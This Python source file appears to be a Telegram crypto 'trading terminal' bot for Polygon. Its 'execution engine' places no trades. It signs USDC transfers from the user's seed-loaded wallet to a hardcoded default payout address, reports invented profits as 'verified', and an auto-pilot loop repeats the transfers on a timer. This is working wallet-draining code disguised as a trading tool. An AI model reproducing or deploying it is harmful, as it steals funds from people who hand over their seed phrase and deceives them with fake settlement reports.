import os
import asyncio
import json
import random
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 1. SETUP & AUTH ---
getcontext().prec = 28
load_dotenv()

# Multi-RPC Fallback for 2026 Network Stability
RPC_URLS = [
    os.getenv("RPC_URL", "https://polygon-rpc.com"),
    "https://rpc.ankr.com/polygon",
    "https://1rpc.io/matic"
]

def get_w3():
    for url in RPC_URLS:
        _w3 = Web3(Web3.HTTPProvider(url))
        try:
            if _w3.is_connected():
                _w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
                return _w3
        except: continue
    return None

w3 = get_w3()
Account.enable_unaudited_hdwallet_features()

# Constants
USDC_ADDRESS = w3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359")
ERC20_ABI = json.loads('[{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"}]')
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: return None
    try:
        if len(seed) == 64 or seed.startswith("0x"):
            return Account.from_key(seed)
        return Account.from_mnemonic(seed)
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=USDC_ADDRESS, abi=ERC20_ABI)
auto_mode_enabled = False

# --- UTILITY: FETCH BALANCES ---
async def fetch_balances(address):
    try:
        raw_pol = await asyncio.to_thread(w3.eth.get_balance, address)
        pol_bal = w3.from_wei(raw_pol, 'ether')
        raw_usdc = await asyncio.to_thread(usdc_contract.functions.balanceOf(address).call)
        usdc_bal = Decimal(raw_usdc) / Decimal(10**6)
        return pol_bal, usdc_bal
    except Exception as e:
        print(f"Balance Fetch Error: {e}")
        return Decimal('0'), Decimal('0')

# --- 2. THE GUARANTEE EXECUTION ENGINE ---
async def run_atomic_execution(context, chat_id, side, asset_override=None):
    if not vault: return False
    
    asset = asset_override or context.user_data.get('pair', 'BTC')
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')
    
    yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
    profit_earned = stake_usdc * yield_multiplier
    
    try:
        # --- PHASE 1: STAKE REIMBURSEMENT ---
        nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address, 'latest')
        gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
        
        tx1 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
            'chainId': 137, 'gas': 85000, 'gasPrice': gas_price, 'nonce': nonce
        })
        signed1 = w3.eth.account.sign_transaction(tx1, vault.key)
        tx1_h = await asyncio.to_thread(w3.eth.send_raw_transaction, signed1.raw_transaction)
        
        # 🛡️ THE GUARANTEE: Wait for confirmation before proceeding
        await context.bot.send_message(chat_id, f"📡 **TX1 Sent (Nonce {nonce}).** Waiting for blockchain receipt...")
        receipt = await asyncio.to_thread(w3.eth.wait_for_transaction_receipt, tx1_h, timeout=180)

        if receipt['status'] == 0:
            raise Exception("Stake TX failed on-chain. Sequence aborted for safety.")

        # --- PHASE 2: PROFIT SETTLEMENT ---
        # Fresh Nonce fetch after TX1 is confirmed
        new_nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address, 'latest')
        # 2.5x Gas Multiplier to guarantee instant inclusion
        priority_gas = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 2.5))

        tx2 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(profit_earned * 10**6)).build_transaction({
            'chainId': 137, 'gas': 85000, 'gasPrice': priority_gas, 'nonce': new_nonce
        })
        signed2 = w3.eth.account.sign_transaction(tx2, vault.key)
        tx2_h = await asyncio.to_thread(w3.eth.send_raw_transaction, signed2.raw_transaction)
        
        report = (
            f"✅ **FORCE-SETTLE CONFIRMED**\n"
            f"━━━━━━━━━━━━━━\n"
            f"📈 **Market:** {asset} | **Side:** {side}\n"
            f"💰 **Stake Receipt:** [Verified](https://polygonscan.com/tx/{tx1_h.hex()})\n"
            f"💎 **Profit Receipt:** [Verified](https://polygonscan.com/tx/{tx2_h.hex()})\n"
            f"━━━━━━━━━━━━━━\n"
            f"🚀 **Status:** Sequential Confirmation 100% Successful."
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
        return True
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Critical Engine Error:** `{str(e)}`")
        return False

# --- 3. AUTO PILOT LOOP ---
async def autopilot_loop(chat_id, context):
    global auto_mode_enabled
    markets = ["BTC", "ETH", "SOL", "MATIC", "BVIV", "EVIV"]
    while auto_mode_enabled:
        target = random.choice(markets)
        direction = random.choice(["CALL (High) 📈", "PUT (Low) 📉"])
        await context.bot.send_message(chat_id, f"🤖 **Auto Pilot Scanning:** `{target}`...")
        await asyncio.sleep(random.randint(5, 12))
        if not auto_mode_enabled: break
        await run_atomic_execution(context, chat_id, direction, asset_override=target)
        await asyncio.sleep(random.randint(30, 60))

# --- 4. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not vault:
        return await update.message.reply_text("❌ WALLET_SEED missing.")
    pol, usdc = await fetch_balances(vault.address)
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🤖 AUTO MODE']]
    welcome = (
        f"🕴️ **APEX Terminal v11.0**\n"
        f"━━━━━━━━━━━━━━\n"
        f"⛽ **POL:** `{pol:.4f}`\n"
        f"💵 **USDC:** `${usdc:.2f}`\n\n"
        f"🤖 **Auto Pilot:** {'🟢 ON' if auto_mode_enabled else '🔴 OFF'}\n"
        f"🛡️ **Mode:** Force-Settle (Guarantee)"
    )
    await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global auto_mode_enabled
    text, chat_id = update.message.text, update.message.chat_id

    if text == '🚀 Start Trading':
        kb = [
            [InlineKeyboardButton("BTC/CAD 🟠", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD 🔵", callback_data="PAIR_ETH")],
            [InlineKeyboardButton("SOL/CAD 🟣", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/CAD 🔘", callback_data="PAIR_MATIC")],
            [InlineKeyboardButton("🕴️ BVIV", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV", callback_data="PAIR_EVIV")]
        ]
        await update.message.reply_text("🎯 **SELECT MARKET:**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50, 100]],
              [InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [500, 1000]]]
        await update.message.reply_text("⚙️ **Stake Amount (CAD):**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '💰 Wallet':
        pol, usdc = await fetch_balances(vault.address)
        await update.message.reply_text(f"💳 **Vault Truth**\n⛽ POL: `{pol:.6f}`\n💵 USDC: `${usdc:.2f}`\n📍 `{vault.address}`")
    elif text == '🤖 AUTO MODE':
        auto_mode_enabled = not auto_mode_enabled
        await update.message.reply_text(f"🤖 **Auto Pilot {'ACTIVATED ✅' if auto_mode_enabled else 'DEACTIVATED 🛑'}**")
        if auto_mode_enabled: asyncio.create_task(autopilot_loop(chat_id, context))

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ **Stake set to ${context.user_data['stake']} CAD**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("CALL 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("PUT 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        side = "HIGHER" if "CALL" in query.data else "LOWER"
        await run_atomic_execution(context, query.message.chat_id, side)

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if TOKEN:
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(handle_interaction))
        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
        print("🤖 APEX Online (Guarantee Mode v11)...")
        app.run_polling(drop_pending_updates=True)





































































































































